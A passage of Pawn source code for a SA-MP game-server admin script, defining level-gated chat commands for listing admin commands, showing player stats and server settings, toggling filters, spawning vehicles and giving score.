		SendClientMessage(playerid,lightblue,"GENERAL: slap, burn, warn, kick, ban, explode, jail, freeze, mute, crash, ubound, god, godcar, ping");
		SendClientMessage(playerid,lightblue,"GENERAL: setping, lockserver, enable/disable, setlevel, setinterior, givecar, jetpack, force, spawn");
		SendClientMessage(playerid,lightblue,"VEHICLE: flip, fix, repair, lockcar, eject, ltc, car, lcar, lbike, lplane, lheli, lboat, lnos, cm");
		SendClientMessage(playerid,lightblue,"TELE: goto, gethere, get, teleplayer, ltele, vgoto, lgoto, moveplayer");
		SendClientMessage(playerid,lightblue,"SET: set(cash/health/armour/gravity/name/time/weather/skin/colour/wanted/templevel)");
		SendClientMessage(playerid,lightblue,"SETALL: setall(world/weather/wanted/time/score/cash)");
		SendClientMessage(playerid,lightblue,"ALL: giveallweapon, healall, armourall, freezeall, kickall, ejectall, killall, disarmall, slapall, spawnall");
	}
	return 1;
}

CMD:lcommands(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 1)
	{
		SendClientMessage(playerid,blue,"    ---= All Admin Commands =---");
		SendClientMessage(playerid,lightblue," /level1, /level2, /level3, /level4, /level5, /level6, /ladmin");
		SendClientMessage(playerid,lightblue,"Player Commands: /register, /login, /report, /stats, /time, /changepass, /resetstats, /getid");
	}
	return 1;
}

CMD:acmds0(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 1)
	{
	ShowPlayerDialog(playerid,786,DIALOG_STYLE_LIST,"Chose any level","{FCF7F9}Level 1:Trail Admin \n{1C9139}Level 2:Server Admin\n{2D5CAD}Level 3:Senior Admin\n{E8B82A}Level 4:Lead Admin\n{FF0000}Level 5:Head Admin\n{16F2E7}Level 6:Co-Owner","Select","Cancel");
	  } else return SendClientMessage(playerid,red,"JikyBot: You Need To Be Atleast Level 1 To Use This Command");
	return 1;
}
CMD:level2(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 2)
	{
		SendClientMessage(playerid,blue,"    ---=Level 2 Admin Commands =---");
		SendClientMessage(playerid,lightblue,"giveweapon, setcolour, lockcar, unlockcar, burn, spawn, disarm, lcar, lbike,");
		SendClientMessage(playerid,lightblue,"lheli, lboat, lplane, hightlight, screen, jetpack, flip, forceteam, forceclass");
		SendClientMessage(playerid,lightblue,"goto, vgoto, lgoto, kick, warn, slap, jailed, frozen, mute, unmute, muted,");
		SendClientMessage(playerid,lightblue,"laston, ls, lsof, lsv, clearchat, lmenu, ltele, cm, ltmenu,");
		SendClientMessage(playerid,lightblue,"write, explode, burn, ban, unban, unbanip, sban, bannick");
	}
	return 1;
}

CMD:level3(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 3)
	{
		SendClientMessage(playerid,blue,"    ---=Level 3 Admin Commands =---");
		SendClientMessage(playerid,lightblue,"sethealth, setarmour, setcash, setskin, setwanted, setweather,");
		SendClientMessage(playerid,lightblue,"settime, setworld, setinterior, force, eject, bankrupt, sbankrupt, ubound, lweaps,");
		SendClientMessage(playerid,lightblue,"lammo, car, carhealth, carcolour, setping, destroycar,");
		SendClientMessage(playerid,lightblue,"teleplayer, vget, givecar, gethere, get, jail, unjail, freeze, ");
		SendClientMessage(playerid,lightblue,"unfreeze, akill,aka, disablechat, ban, clearallchat, caps, move, moveplayer, healall,");
		SendClientMessage(playerid,lightblue,"setallweather, setalltime, setallworld, unfreezeall");
		SendClientMessage(playerid,lightblue,"lweather, ltime, lweapons,changename, hydra, hunter");
	}
	return 1;
}

CMD:level4(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 4)
	{
		SendClientMessage(playerid,blue,"    ---=Level 4 Admin Commands =---");
		SendClientMessage(playerid,lightblue,"enable, disable, ban, rban, crash, spam, god, godcar, die, uconfig,");
		SendClientMessage(playerid,lightblue,"botcheck, forbidname, forbidword, getteam, freezeteam, unfreezeteam ");
		SendClientMessage(playerid,lightblue,"fakedeath, spawnall, muteall, unmuteall, getall, killall, freezeall, Giveallweapon, Armourall, GiveAllcash.");
		SendClientMessage(playerid,lightblue,"kickall, slapalll, explodeall, disarmall, ejectall, rheal");
		SendClientMessage(playerid,lightblue,"gsteam, gcteam, fteam, steam, gteam, dteam, announce, announce2");
	}
	return 1;
}

CMD:level5(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 5)
	{
		SendClientMessage(playerid,blue,"    ---=Level 5 Admin Commands =---");
		SendClientMessage(playerid,lightblue,"god, sgod, pickup, object, fakechat, setallscore, setdonor, saveallstats, setpass");
		SendClientMessage(playerid,lightblue,"setoperator, unsetoperator, setlevel, settemplevel , setkills, setdeaths, rban, setname, @ for l5 chat");
	}
	return 1;
}

CMD:level6(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 6)
	{
		SendClientMessage(playerid,blue,"level 1-5 cmds ,mapeditor,text");
	}
	return 1;
}

CMD:thelp(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Helper] == 1)
	{
		SendClientMessage(playerid,blue,"    ---= Server Tester Commands =---");
		SendClientMessage(playerid,lightblue,"lspec(lsp), lspecoff(lspoff),warn, IP, Weaps, kick, osay [text]");
		SendClientMessage(playerid,lightblue,"reports, afk");
		} else return SendClientMessage(playerid,red,"JikyBot: You need to be Server Tester to use this command");
	return 1;
}
CMD:lconfig(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] > 0)
	{
	    new string[128];
		SendClientMessage(playerid,blue,"    ---=== LAdmin Configuration ===---");
		format(string, sizeof(string), "Max Ping: %dms | ReadPms %d | ReadCmds %d | Max Admin Level %d | AdminOnlySkins %d", ServerInfo[MaxPing],  ServerInfo[ReadPMs],  ServerInfo[ReadCmds],  ServerInfo[MaxAdminLevel],  ServerInfo[AdminOnlySkins] );
		SendClientMessage(playerid,blue,string);
		format(string, sizeof(string), "AdminSkin1 %d | AdminSkin2 %d | NameKick %d | AntiBot %d | AntiSpam %d | AntiSwear %d", ServerInfo[AdminSkin], ServerInfo[AdminSkin2], ServerInfo[NameKick], ServerInfo[AntiBot], ServerInfo[AntiSpam], ServerInfo[AntiSwear] );
		SendClientMessage(playerid,blue,string);
		format(string, sizeof(string), "NoCaps %d | Locked %d | Pass %s | SaveWeaps %d | SaveMoney %d | ConnectMessages %d | AdminCmdMsgs %d", ServerInfo[NoCaps], ServerInfo[Locked], ServerInfo[Password], ServerInfo[GiveWeap], ServerInfo[GiveMoney], ServerInfo[ConnectMessages], ServerInfo[AdminCmdMsg] );
		SendClientMessage(playerid,blue,string);
		format(string, sizeof(string), "AutoLogin %d | MaxMuteWarnings %d | ChatDisabled %d | MustLogin %d | MustRegister %d", ServerInfo[AutoLogin], ServerInfo[MaxMuteWarnings], ServerInfo[DisableChat], ServerInfo[MustLogin], ServerInfo[MustRegister] );
		SendClientMessage(playerid,blue,string);
	}
	return 1;
}

CMD:astats(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid,red,"JikyBot: Usage:/getinfo [playerid]");
	    new player1, string[128];
	    player1 = strval(params);
	    CMDMessageToAdmins(playerid,"ASTATS");

	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
		    new Float:player1health, Float:player1armour, playerip[128], Float:x, Float:y, Float:z, tmp2[256], file[256],
				year, month, day, P1Jailed[4], P1Frozen[4], P1Logged[4], P1Register[4], RegDate[256], TimesOn;

			GetPlayerHealth(player1,player1health);
			GetPlayerArmour(player1,player1armour);
	    	GetPlayerIp(player1, playerip, sizeof(playerip));
	    	GetPlayerPos(player1,x,y,z);
			getdate(year, month, day);
			format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(PlayerName2(player1)));

			if(PlayerInfo[player1][Jailed] == 1) P1Jailed = "Yes"; else P1Jailed = "No";
			if(PlayerInfo[player1][Frozen] == 1) P1Frozen = "Yes"; else P1Frozen = "No";
			if(Logged[player1] == 1) P1Logged = "Yes"; else P1Logged = "No";
			if(fexist(file)) P1Register = "Yes"; else P1Register = "No";
			if(dUserINT(PlayerName2(player1)).("LastOn")==0) tmp2 = "Never"; else tmp2 = dini_Get(file,"LastOn");
			if(strlen(dini_Get(file,"RegisteredDate")) < 3) RegDate = "n/a"; else RegDate = dini_Get(file,"RegisteredDate");
			TimesOn = dUserINT(PlayerName2(player1)).("TimesOnServer");

	  		format(string, sizeof(string),"(Player Info)  ---====> Name: %s  ID: %d <====---", PlayerName2(player1), player1);
			SendClientMessage(playerid,lightblue,string);
		  	format(string, sizeof(string),"Health: %d  Armour: %d  Score: %d  Cash: %d  Skin: %d  IP: %s Ping: %d",floatround(player1health),floatround(player1armour),
			GetPlayerScore(player1),GetPlayerMoney(player1),GetPlayerSkin(player1),playerip,GetPlayerPing(player1));
			SendClientMessage(playerid,red,string);
			format(string, sizeof(string),"Interior: %d  Virtual World: %d  Wanted Level: %d  X %0.1f  Y %0.1f  Z %0.1f", GetPlayerInterior(player1), GetPlayerVirtualWorld(player1), GetPlayerWantedLevel(player1), Float:x,Float:y,Float:z);
			SendClientMessage(playerid,orange,string);
			format(string, sizeof(string),"Times On Server: %d  Kills: %d  Deaths: %d  Ratio: %0.2f  AdminLevel: %d", TimesOn, PlayerInfo[player1][Kills], PlayerInfo[player1][Deaths], Float:PlayerInfo[player1][Kills]/Float:PlayerInfo[player1][Deaths], PlayerInfo[player1][Level] );
			SendClientMessage(playerid,yellow,string);
			format(string, sizeof(string),"Registered: %s  Logged In: %s  In Jail: %s  Frozen: %s", P1Register, P1Logged, P1Jailed, P1Frozen );
			SendClientMessage(playerid,green,string);
			format(string, sizeof(string),"Last On Server: %s  Register Date: %s  Todays Date: %d/%d/%d", tmp2, RegDate, day,month,year );
			SendClientMessage(playerid,COLOR_GREEN,string);

			if(IsPlayerInAnyVehicle(player1)) {
				new Float:VHealth, carid = GetPlayerVehicleID(playerid); GetVehicleHealth(carid,VHealth);
				format(string, sizeof(string),"VehicleID: %d  Model: %d  Vehicle Name: %s  Vehicle Health: %d",carid, GetVehicleModel(carid), VehicleNames[GetVehicleModel(carid)-400], floatround(VHealth) );
				SendClientMessage(playerid,COLOR_BLUE,string);
			}

			new slot, ammo, weap, cnt, WeapName[24], WeapSTR[128], p; WeapSTR = "Weaps: ";
			for (slot = 0; slot < 14; slot++) {	GetPlayerWeaponData(player1, slot, weap, ammo); if( ammo != 0 && weap != 0) cnt++; }
			if(cnt < 1) return SendClientMessage(playerid,lightblue,"Player has no weapons");
			else {
				for (slot = 0; slot < 14; slot++)
				{
					GetPlayerWeaponData(player1, slot, weap, ammo);
					if (ammo > 0 && weap > 0)
					{
						GetWeaponName(weap, WeapName, sizeof(WeapName) );
						if (ammo == 65535 || ammo == 1) format(WeapSTR,sizeof(WeapSTR),"%s%s (1)",WeapSTR, WeapName);
						else format(WeapSTR,sizeof(WeapSTR),"%s%s (%d)",WeapSTR, WeapName, ammo);
						p++;
						if(p >= 5) { SendClientMessage(playerid, lightblue, WeapSTR); format(WeapSTR, sizeof(WeapSTR), "Weaps: "); p = 0;
						} else format(WeapSTR, sizeof(WeapSTR), "%s,  ", WeapSTR);
					}
				}
				if(p <= 4 && p > 0) {
					string[strlen(string)-3] = '.';
				    SendClientMessage(playerid, lightblue, WeapSTR);
				}
			}
			return 1;
		} else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be administrator level 2 to use this command");
}

CMD:disable(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 4 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) {
			SendClientMessage(playerid,red,"JikyBot: Usage:/disable [antiswear / namekick / antispam / ping / readcmds / readpms /caps / admincmdmsgs");
			return SendClientMessage(playerid,red,"       /connectmsgs / autologin ]");
		}
	    new string[128], file[256]; format(file,sizeof(file),"ladmin/config/Config.sav");
		if(strcmp(params,"antiswear",true) == 0) {
			ServerInfo[AntiSwear] = 0;
			dini_IntSet(file,"AntiSwear",0);
			format(string,sizeof(string),"Administrator %s has disabled antiswear", PlayerName2(playerid));
			SendClientMessageToAll(blue,string);
		} else if(strcmp(params,"namekick",true) == 0) {
			ServerInfo[NameKick] = 0;
			dini_IntSet(file,"NameKick",0);
			format(string,sizeof(string),"Administrator %s has disabled namekick", PlayerName2(playerid));
			SendClientMessageToAll(blue,string);
	 	} else if(strcmp(params,"antispam",true) == 0)	{
			ServerInfo[AntiSpam] = 0;
			dini_IntSet(file,"AntiSpam",0);
			format(string,sizeof(string),"Administrator %s has disabled antispam", PlayerName2(playerid));
			SendClientMessageToAll(blue,string);
		} else if(strcmp(params,"ping",true) == 0)	{
			ServerInfo[MaxPing] = 0;
			dini_IntSet(file,"MaxPing",0);
			format(string,sizeof(string),"Administrator %s has disabled ping kick", PlayerName2(playerid));
			SendClientMessageToAll(blue,string);
		} else if(strcmp(params,"readcmds",true) == 0) {
			ServerInfo[ReadCmds] = 0;
			dini_IntSet(file,"ReadCMDs",0);
			format(string,sizeof(string),"Administrator %s has disabled reading commands", PlayerName2(playerid));
			MessageToAdmins(blue,string);
		} else if(strcmp(params,"readpms",true) == 0) {
			ServerInfo[ReadPMs] = 0;
			dini_IntSet(file,"ReadPMs",0);
			format(string,sizeof(string),"Administrator %s has disabled reading pms", PlayerName2(playerid));
			MessageToAdmins(blue,string);
  		} else if(strcmp(params,"caps",true) == 0)	{
			ServerInfo[NoCaps] = 1;
			dini_IntSet(file,"NoCaps",1);
			format(string,sizeof(string),"Administrator %s has prevented captial letters in chat", PlayerName2(playerid));
			SendClientMessageToAll(blue,string);
		} else if(strcmp(params,"admincmdmsgs",true) == 0) {
			ServerInfo[AdminCmdMsg] = 0;
			dini_IntSet(file,"AdminCMDMessages",0);
			format(string,sizeof(string),"Administrator %s has disabled admin command messages", PlayerName2(playerid));
			MessageToAdmins(green,string);
		} else if(strcmp(params,"connectmsgs",true) == 0)	{
			ServerInfo[ConnectMessages] = 0;
			dini_IntSet(file,"ConnectMessages",0);
			format(string,sizeof(string),"Administrator %s has disabled connect & disconnect messages", PlayerName2(playerid));
			MessageToAdmins(green,string);
		} else if(strcmp(params,"autologin",true) == 0)	{
			ServerInfo[AutoLogin] = 0;
			dini_IntSet(file,"AutoLogin",0);
			format(string,sizeof(string),"Administrator %s has disabled auto login", PlayerName2(playerid));
			MessageToAdmins(green,string);
		} else {
			SendClientMessage(playerid,red,"JikyBot: Usage:/disable [antiswear / namekick / antispam / ping / readcmds / readpms /caps /cmdmsg ]");
		} return 1;
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:enable(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 4 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) {
			SendClientMessage(playerid,red,"JikyBot: Usage:/enable [antiswear / namekick / antispam / ping / readcmds / readpms /caps / admincmdmsgs");
			return SendClientMessage(playerid,red,"       /connectmsgs / autologin ]");
		}
	    new string[128], file[256]; format(file,sizeof(file),"ladmin/config/Config.sav");
		if(strcmp(params,"antiswear",true) == 0) {
			ServerInfo[AntiSwear] = 1;
			dini_IntSet(file,"AntiSwear",1);
			format(string,sizeof(string),"Administrator %s has enabled antiswear", PlayerName2(playerid));
			SendClientMessageToAll(blue,string);
		} else if(strcmp(params,"namekick",true) == 0)	{
			ServerInfo[NameKick] = 1;
			format(string,sizeof(string),"Administrator %s has enabled namekick", PlayerName2(playerid));
			SendClientMessageToAll(blue,string);
 		} else if(strcmp(params,"antispam",true) == 0)	{
			ServerInfo[AntiSpam] = 1;
			dini_IntSet(file,"AntiSpam",1);
			format(string,sizeof(string),"Administrator %s has enabled antispam", PlayerName2(playerid));
			SendClientMessageToAll(blue,string);
		} else if(strcmp(params,"ping",true) == 0)	{
			ServerInfo[MaxPing] = 800;
			dini_IntSet(file,"MaxPing",800);
			format(string,sizeof(string),"Administrator %s has enabled ping kick", PlayerName2(playerid));
			SendClientMessageToAll(blue,string);
		} else if(strcmp(params,"readcmds",true) == 0)	{
			ServerInfo[ReadCmds] = 1;
			dini_IntSet(file,"ReadCMDs",1);
			format(string,sizeof(string),"Administrator %s has enabled reading commands", PlayerName2(playerid));
			MessageToAdmins(blue,string);
		} else if(strcmp(params,"readpms",true) == 0) {
			ServerInfo[ReadPMs] = 1;
			dini_IntSet(file,"ReadPMs",1);
			format(string,sizeof(string),"Administrator %s has enabled reading pms", PlayerName2(playerid));
			MessageToAdmins(blue,string);
		} else if(strcmp(params,"caps",true) == 0)	{
			ServerInfo[NoCaps] = 0;
			dini_IntSet(file,"NoCaps",0);
			format(string,sizeof(string),"Administrator %s has allowed captial letters in chat", PlayerName2(playerid));
			SendClientMessageToAll(blue,string);
		} else if(strcmp(params,"admincmdmsgs",true) == 0)	{
			ServerInfo[AdminCmdMsg] = 1;
			dini_IntSet(file,"AdminCmdMessages",1);
			format(string,sizeof(string),"Administrator %s has enabled admin command messages", PlayerName2(playerid));
			MessageToAdmins(green,string);
		} else if(strcmp(params,"connectmsgs",true) == 0) {
			ServerInfo[ConnectMessages] = 1;
			dini_IntSet(file,"ConnectMessages",1);
			format(string,sizeof(string),"Administrator %s has enabled connect & disconnect messages", PlayerName2(playerid));
			MessageToAdmins(green,string);
		} else if(strcmp(params,"autologin",true) == 0) {
			ServerInfo[AutoLogin] = 1;
			dini_IntSet(file,"AutoLogin",1);
			format(string,sizeof(string),"Administrator %s has enabled auto login", PlayerName2(playerid));
			MessageToAdmins(green,string);
		} else {
			SendClientMessage(playerid,red,"JikyBot: Usage:/enable [antiswear / namekick / antispam / ping / readcmds / readpms /caps /cmdmsg ]");
		} return 1;
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:ownersp(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 10) {
		GivePlayerWeapon(playerid,28,1000); GivePlayerWeapon(playerid,31,1000); GivePlayerWeapon(playerid,34,1000);
		GivePlayerWeapon(playerid,38,1000); GivePlayerWeapon(playerid,16,1000);	GivePlayerWeapon(playerid,42,1000);
		GivePlayerWeapon(playerid,14,1000); GivePlayerWeapon(playerid,46,1000);	GivePlayerWeapon(playerid,9,1);
		GivePlayerWeapon(playerid,24,1000); GivePlayerWeapon(playerid,26,1000); return 1;
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be level 3 to use this command");
}


CMD:lammo(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 5) {
		MaxAmmo(playerid);
		return CMDMessageToAdmins(playerid,"LAMMO");
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be level 3 to use this command");
}

CMD:vr(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 1) {
		if (IsPlayerInAnyVehicle(playerid)) {
			SetVehicleHealth(GetPlayerVehicleID(playerid),1250.0);
			return SendClientMessage(playerid,blue,"Vehicle Fixed");
		} else return SendClientMessage(playerid,red,"JikyBot: You are not in a vehicle");
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be level 1 to use this command");
}

CMD:afix(playerid,params[]) {
    if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8) {
	    if(isnull(params)) {
		    if(IsPlayerInAnyVehicle(playerid)) {
			RepairVehicle(GetPlayerVehicleID(playerid));
            SetVehicleHealth(GetPlayerVehicleID(playerid), 1000);
			CMDMessageToAdmins(playerid,"AFIX"); return SendClientMessage(playerid, blue,"Vehicle Fixed. You can also do /afix [playerid]");
			} else return SendClientMessage(playerid,red,"JikyBot: You are not in a vehicle. You can also do /afix [playerid]");
		}
	    new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
	    player1 = strval(params);

	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid) {
			if (IsPlayerInAnyVehicle(player1)) {
				RepairVehicle(GetPlayerVehicleID(player1));
			    SetVehicleHealth(GetPlayerVehicleID(player1), 1000);
				CMDMessageToAdmins(playerid,"AFIX");
				GetPlayerName(player1, playername, sizeof(playername));		GetPlayerName(playerid, adminname, sizeof(adminname));
				format(string,sizeof(string),"Administrator %s Fixed your vehicle.",adminname); SendClientMessage(player1,blue,string);
				format(string,sizeof(string),"You have fixed %s's vehicle.", playername);
				return SendClientMessage(playerid, blue,string);
			} else return SendClientMessage(playerid,red,"JikyBot: This player isn't in a vehicle");
		} else return SendClientMessage(playerid, red, "Player is not connected or is yourself");
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be on adminduty to use this command");
}

CMD:ltune(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8) {
		if(IsPlayerInAnyVehicle(playerid)) {
        new LVehicleID = GetPlayerVehicleID(playerid), LModel = GetVehicleModel(LVehicleID);
        switch(LModel)
		{
			case 448,461,462,463,468,471,509,510,521,522,523,581,586,449:
			return SendClientMessage(playerid,red,"JikyBot: You can not tune this vehicle");
		}
        CMDMessageToAdmins(playerid,"LTUNE");
		SetVehicleHealth(LVehicleID,2000.0);
		TuneLCar(LVehicleID);
		return PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
		} else return SendClientMessage(playerid,red,"JikyBot: You are not in a vehicle");
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be level 1 to use this command");
}

CMD:lhy(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8) {
		if(IsPlayerInAnyVehicle(playerid)) {
        new LVehicleID = GetPlayerVehicleID(playerid), LModel = GetVehicleModel(LVehicleID);
        switch(LModel)
		{
			case 448,461,462,463,468,471,509,510,521,522,523,581,586,449:
			return SendClientMessage(playerid,red,"JikyBot: You can not tune this vehicle!");
		}
        AddVehicleComponent(LVehicleID, 1087);
		return PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
		} else return SendClientMessage(playerid,red,"JikyBot: You are not in a vehicle");
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be level 1 to use this command");
}
CMD:lcar(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8) {
		if (!IsPlayerInAnyVehicle(playerid)) {
			CarSpawner(playerid,411);
			CMDMessageToAdmins(playerid,"LCAR");
			return SendClientMessage(playerid,blue,"Enjoy your new car");
		} else return SendClientMessage(playerid,red,"JikyBot: You already have a vehicle");
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be level 1 to use this command");
}

CMD:gas(playerid,params[])
{
    if(PlayerInfo[playerid][Level] >= 4) {
      new tmp[256], Index; tmp = strtok(params,Index);
      if(isnull(tmp) || !IsNumeric(tmp)) return SendClientMessage(playerid, red, "JikyBot: Usage:/gas [score]");
        new score = strval(tmp), string[128];
        CMDMessageToAdmins(playerid,"GIVEALLSCORE");
        for(new i;i<GetMaxPlayers();i++)
        {
        SetPlayerScore(i,GetPlayerScore(i)+score);
        PlayerPlaySound(i, 1057,0.0,0.0,0.0);
        }
        format(string,128,"Administrator \"%s\" has given everyone '%d' Scores : Rewards!",pName(playerid),score);
        SendClientMessageToAll(C_PINK, string);
        GameTextForAll(""cred"Recieved Scores From Admins Online!",5000,3);
    } else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
    return 1;
}
CMD:givescore(playerid, params[])
{
	if(PlayerInfo[playerid][Level] >= 4)
	{
    new giveplayerid,
    amount,
    gscore = GetPlayerScore(playerid);
    if(sscanf(params, "ud", giveplayerid, amount)) return SendClientMessage(playerid, 0xFF0000AA, "JikyBot: Usage:/givescore [playerid/partname] [amount]");
    else if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, 0xFF0000AA, "JikyBot: Player not found");
    else if(amount > gscore) return SendClientMessage(playerid, 0xFF0000AA, "ERROE:Unknown Score");
    {
        SetPlayerScore(giveplayerid,GetPlayerScore(giveplayerid) + amount);
        CMDMessageToAdmins(playerid,"GIVESCORE");
        SendClientMessage(playerid, 0x00FF00AA, "Score Sent");
        SendClientMessage(giveplayerid, 0x00FF00AA, "You Recieved Scores From an admin");
        GameTextForPlayer(playerid,"Recieved Scores From Admins Online!",5000,3);
    }
	if(PlayerInfo[playerid][Level] <= 4)
	{
	SendClientMessage(playerid, red, "[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
    }
    }
	return 1;
}
CMD:giveallscore(playerid,params[])
{
    if(PlayerInfo[playerid][Level] >= 4) {
        new score;
        if(sscanf(params,"d",score)) return SendClientMessage(playerid, red, "JikyBot: Usage:/giveallscore [score]");
        new string[128];
        CMDMessageToAdmins(playerid,"GIVEALLSCORE");
        foreach(Player, i)
        {
	        SetPlayerScore(i,GetPlayerScore(i)+score);
	        PlayerPlaySound(i, 1057,0.0,0.0,0.0);
        }
        format(string,128,"Administrator \"%s\" has given all players '%d' Score!",pName(playerid),score);
        SendClientMessageToAll(C_PINK, string);
    } else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
    return 1;
}
CMD:lbike(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8) {
		if (!IsPlayerInAnyVehicle(playerid)) {
			CarSpawner(playerid,522);
			CMDMessageToAdmins(playerid,"LBIKE");
			return SendClientMessage(playerid,blue,"Enjoy your new bike");
		} else return SendClientMessage(playerid,red,"JikyBot: You already have a vehicle");
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be level 1 to use this command");
}
CMD:hydra(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8) {
		if (!IsPlayerInAnyVehicle(playerid)) {
			CarSpawner(playerid,520);
			CMDMessageToAdmins(playerid,"HYDRA");
			return SendClientMessage(playerid,blue,"Hydra Spawned");
		} else return SendClientMessage(playerid,red,"JikyBot: You already have a vehicle");
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be level 3 to use this command");
}
CMD:hunter(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8) {
		if (!IsPlayerInAnyVehicle(playerid)) {
			CarSpawner(playerid,425);
			CMDMessageToAdmins(playerid,"HUNTER");
			return SendClientMessage(playerid,blue,"Hunter Spawned");
		} else return SendClientMessage(playerid,red,"JikyBot: You already have a vehicle");
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be level 3 to use this command");
}
CMD:lheli(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8) {
		if (!IsPlayerInAnyVehicle(playerid)) {
			CarSpawner(playerid,487);
			CMDMessageToAdmins(playerid,"LHELI");
			return SendClientMessage(playerid,blue,"Enjoy your new helicopter");
		} else return SendClientMessage(playerid,red,"JikyBot: You already have a vehicle");
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be level 1 to use this command");
}

CMD:lboat(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8) {
		if (!IsPlayerInAnyVehicle(playerid)) {
			CarSpawner(playerid,493);
			CMDMessageToAdmins(playerid,"LBOAT");
			return SendClientMessage(playerid,blue,"Enjoy your new boat");
		} else return SendClientMessage(playerid,red,"JikyBot: You already have a vehicle");
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be level 1 to use this command");
}

CMD:lplane(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8) {
		if (!IsPlayerInAnyVehicle(playerid)) {
			CarSpawner(playerid,513);
			CMDMessageToAdmins(playerid,"LPLANE");
			return SendClientMessage(playerid,blue,"Enjoy your new plane");
		} else return SendClientMessage(playerid,red,"JikyBot: You already have a vehicle");
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be level 1 to use this command");
}

CMD:lnos(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8) {
		if(IsPlayerInAnyVehicle(playerid)) {
	        switch(GetVehicleModel( GetPlayerVehicleID(playerid) )) {
				case 448,461,462,463,468,471,509,510,521,522,523,581,586,449:
				return SendClientMessage(playerid,red,"JikyBot: You can not tune this vehicle!");
			}
	        AddVehicleComponent(GetPlayerVehicleID(playerid), 1010);
			return PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
		} else return SendClientMessage(playerid,red,"JikyBot: You must be in a vehicle.");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:ltram(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8) {
		if (!IsPlayerInAnyVehicle(playerid)) {
			CarSpawner(playerid,449);
			CMDMessageToAdmins(playerid,"LCAR");
			return SendClientMessage(playerid,blue,"Enjoy your new car");
		} else return SendClientMessage(playerid,red,"JikyBot: You already have a vehicle");
